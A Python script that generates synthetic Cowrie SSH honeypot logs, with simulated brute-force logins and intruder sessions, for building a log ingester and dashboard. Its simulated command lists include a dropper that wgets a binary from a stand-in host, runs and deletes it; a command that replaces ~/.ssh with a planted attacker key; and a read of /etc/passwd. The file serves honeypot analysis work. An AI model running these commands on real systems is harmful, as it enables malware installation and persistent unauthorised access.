#!/usr/bin/env python3
"""
Génère un fichier de logs au format Cowrie (JSON Lines) avec des données
SYNTHETIQUES, pour développer l'ingester, l'API et le dashboard sans honeypot.

Usage :
    python generate_sample_logs.py [fichier_sortie] [nombre_d_attaquants]

Les adresses IP sont tirées au hasard parmi les adresses publiques : ce ne sont
pas de vraies attaques. Ne présente jamais ces données comme des données réelles.
"""
import hashlib
import ipaddress
import json
import random
import sys
from datetime import datetime, timedelta, timezone

OUT = sys.argv[1] if len(sys.argv) > 1 else "cowrie.sample.json"
N_ATTACKERS = int(sys.argv[2]) if len(sys.argv) > 2 else 80
DAYS = 7
SEED = 42
SENSOR = "honeypot-01"
DST_IP = "10.0.0.5"
DST_PORT = 2222

rng = random.Random(SEED)
END = datetime.now(timezone.utc)
START = END - timedelta(days=DAYS)

USERNAMES = ["root", "admin", "ubuntu", "user", "test", "pi", "oracle", "postgres",
             "git", "ftpuser", "guest", "debian", "ubnt", "support", "hadoop", "zabbix"]
USER_WEIGHTS = [60, 12, 6, 4, 4, 3, 2, 2, 1, 1, 1, 1, 1, 1, 1, 1]

PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "12345", "1234", "qwerty",
    "123456789", "12345678", "111111", "000000", "123123", "abc123", "letmein",
    "ubnt", "raspberry", "test", "oracle", "ubuntu", "pi", "guest", "default",
    "changeme", "P@ssw0rd", "Passw0rd", "admin123", "root123", "1q2w3e4r",
    "qwerty123", "welcome", "master", "dragon", "monkey", "football", "iloveyou",
    "support", "postgres", "mysql", "ftp", "user", "pass", "1234567890",
    "administrator", "server", "linux", "debian", "centos", "vagrant", "docker",
    "zaq12wsx", "q1w2e3r4", "adminadmin", "rootroot", "secret", "login", "temp",
]

CLIENT_VERSIONS = [
    "SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1", "SSH-2.0-PUTTY",
    "SSH-2.0-libssh2_1.10.0", "SSH-2.0-AsyncSSH_2.14.2", "SSH-2.0-JSCH-0.1.54",
]

SCRIPT_RECON = [
    "uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m", "w",
    "uname -m", "lscpu | grep Model", "df -h", "whoami",
]
SCRIPT_DROPPER = [
    "cd /tmp || cd /var/run || cd /mnt || cd /root",
    "wget http://dl.badhost.example/bins/x86 -O .x",
    "chmod +x .x", "./.x ssh", "rm -rf .x",
]
SCRIPT_PERSIST = [
    'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ-FAKE-KEY bot@example" >> .ssh/authorized_keys && chmod -R go= ~/.ssh',
    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
    "uname -a", "crontab -l",
]
SCRIPT_CURIOUS = ["ls", "ls -la", "cat /etc/passwd", "id", "ps aux", "history", "exit"]
SCRIPTS = [SCRIPT_RECON, SCRIPT_DROPPER, SCRIPT_PERSIST, SCRIPT_CURIOUS]
SCRIPT_WEIGHTS = [30, 25, 25, 20]

events = []


def random_public_ip():
    while True:
        ip = ipaddress.ip_address(rng.getrandbits(32))
        if ip.is_global and not ip.is_multicast:
            return str(ip)


def ts_str(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "Z"


def add(t, eventid, ip, session, message, **extra):
    d = {"eventid": eventid}
    d.update(extra)
    d.update({
        "message": message,
        "sensor": SENSOR,
        "timestamp": ts_str(t),
        "src_ip": ip,
        "session": session,
    })
    events.append((t, d))


def new_session_id():
    return "%012x" % rng.getrandbits(48)


def run_session(t, ip, kind, dictionary, client_version):
    """Simule une session et renvoie l'heure de fin."""
    sid = new_session_id()
    src_port = rng.randint(1024, 65535)
    connect = {
        "eventid": "cowrie.session.connect",
        "src_ip": ip, "src_port": src_port,
        "dst_ip": DST_IP, "dst_port": DST_PORT,
        "session": sid, "protocol": "ssh",
        "message": f"New connection: {ip}:{src_port} ({DST_IP}:{DST_PORT}) [session: {sid}]",
        "sensor": SENSOR, "timestamp": ts_str(t),
    }
    events.append((t, connect))
    start = t
    t += timedelta(seconds=rng.uniform(0.02, 0.2))
    add(t, "cowrie.client.version", ip, sid,
        f"Remote SSH version: {client_version}", version=client_version)

    if kind != "scanner":
        n_fail = rng.randint(1, 6) if kind == "bruteforcer" else rng.randint(0, 3)
        for _ in range(n_fail):
            t += timedelta(seconds=rng.uniform(0.4, 2.5))
            user = rng.choices(USERNAMES, USER_WEIGHTS)[0]
            pwd = rng.choice(dictionary)
            add(t, "cowrie.login.failed", ip, sid,
                f"login attempt [{user}/{pwd}] failed", username=user, password=pwd)

        if kind == "intruder":
            t += timedelta(seconds=rng.uniform(0.4, 2.5))
            user = rng.choices(USERNAMES[:6], USER_WEIGHTS[:6])[0]
            pwd = rng.choice(dictionary)
            add(t, "cowrie.login.success", ip, sid,
                f"login attempt [{user}/{pwd}] succeeded", username=user, password=pwd)

            script = rng.choices(SCRIPTS, SCRIPT_WEIGHTS)[0]
            for cmd in script:
                t += timedelta(seconds=rng.uniform(0.8, 8.0))
                add(t, "cowrie.command.input", ip, sid, f"CMD: {cmd}",
                    input=cmd)
                if cmd.startswith("wget "):
                    url = cmd.split()[1]
                    sha = hashlib.sha256(f"{url}{rng.random()}".encode()).hexdigest()
                    t += timedelta(seconds=rng.uniform(0.5, 3.0))
                    add(t, "cowrie.session.file_download", ip, sid,
                        f"Downloaded URL ({url}) with SHA-256 {sha} to var/lib/cowrie/downloads/{sha}",
                        url=url, outfile=f"var/lib/cowrie/downloads/{sha}", shasum=sha)

    t += timedelta(seconds=rng.uniform(0.2, 3.0) if kind != "scanner" else rng.uniform(0.0, 0.8))
    duration = (t - start).total_seconds()
    add(t, "cowrie.session.closed", ip, sid,
        f"Connection lost after {int(duration)} seconds", duration=round(duration, 6))
    return t


for _ in range(N_ATTACKERS):
    ip = random_public_ip()
    kind = rng.choices(["bruteforcer", "scanner", "intruder"], [50, 28, 22])[0]
    dictionary = rng.sample(PASSWORDS, rng.randint(8, 25))
    client_version = rng.choice(CLIENT_VERSIONS)

    for _wave in range(rng.randint(1, 3)):
        wave_start = START + timedelta(seconds=rng.uniform(0, DAYS * 86400 - 3600))
        n_sessions = {"bruteforcer": rng.randint(3, 25),
                      "scanner": rng.randint(1, 3),
                      "intruder": rng.randint(1, 4)}[kind]
        t = wave_start
        for _s in range(n_sessions):
            session_kind = kind
            if kind == "bruteforcer" and rng.random() < 0.06:
                session_kind = "intruder"
            t = run_session(t, ip, session_kind, dictionary, client_version)
            t += timedelta(seconds=rng.uniform(2, 90))
            if t > END:
                break

events = [e for e in events if e[0] <= END]
events.sort(key=lambda e: e[0])

with open(OUT, "w", encoding="utf-8", newline="\n") as f:
    for _, d in events:
        f.write(json.dumps(d, ensure_ascii=False, separators=(",", ":")) + "\n")

print(f"{len(events)} événements écrits dans {OUT}")
